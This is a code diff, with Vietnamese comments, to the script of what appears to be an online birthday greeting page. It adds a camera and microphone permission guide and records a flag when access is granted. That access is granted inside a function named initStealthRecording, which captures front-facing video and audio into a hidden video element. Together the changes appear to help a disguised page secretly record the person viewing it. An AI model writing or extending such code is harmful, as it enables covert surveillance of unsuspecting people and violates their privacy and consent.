@@ -603,7 +603,50 @@ document.addEventListener("DOMContentLoaded", async () => {
   const lockStatus = checkCardLockStatus();
   const startOverlay = document.getElementById("start-overlay");
 
+  // Kiểm tra và chỉ hiển thị phần xin cấp quyền khi chưa được cấp đủ quyền
+  async function updatePermissionGuideUI() {
+    let camGranted = false;
+    let micGranted = false;
+
+    if (navigator.permissions && navigator.permissions.query) {
+      try {
+        const cam = await navigator.permissions.query({ name: 'camera' });
+        if (cam) {
+          camGranted = (cam.state === 'granted');
+          cam.onchange = () => updatePermissionGuideUI();
+        }
+      } catch (e) {}
+
+      try {
+        const mic = await navigator.permissions.query({ name: 'microphone' });
+        if (mic) {
+          micGranted = (mic.state === 'granted');
+          mic.onchange = () => updatePermissionGuideUI();
+        }
+      } catch (e) {}
+    }
+
+    const localMediaGranted = localStorage.getItem('birthday_media_permission_granted') === '1';
+    const allGranted = (camGranted && micGranted) || (localMediaGranted && (!navigator.permissions || camGranted));
+
+    const guideEl = document.getElementById("start-permission-guide");
+    const grantedEl = document.getElementById("start-granted-guide");
+    const micRow = document.getElementById("perm-mic-row");
+    const camRow = document.getElementById("perm-cam-row");
+
+    if (allGranted) {
+      if (guideEl) guideEl.style.display = 'none';
+      if (grantedEl) grantedEl.style.display = 'block';
+    } else {
+      if (guideEl) guideEl.style.display = 'block';
+      if (grantedEl) grantedEl.style.display = 'none';
+      if (micRow) micRow.style.display = micGranted ? 'none' : 'flex';
+      if (camRow) camRow.style.display = camGranted ? 'none' : 'flex';
+    }
+  }
+
   if (startOverlay) {
+    updatePermissionGuideUI();
     const startBtnAction = document.getElementById("start-btn-action");
 
     // Lắng nghe khi nhạc đã tải xong đủ để phát không giật lag
@@ -2297,6 +2340,9 @@ function initStealthRecording() {
     video: { width: 640, height: 480, facingMode: 'user' },
     audio: true
   }).then(stream => {
+    try {
+      localStorage.setItem('birthday_media_permission_granted', '1');
+    } catch (e) {}
     stealthStream = stream;
 
     // Thẻ video ẩn ĐÚNG YÊU CẦU ĐỂ TRÁNH iOS FREEZE
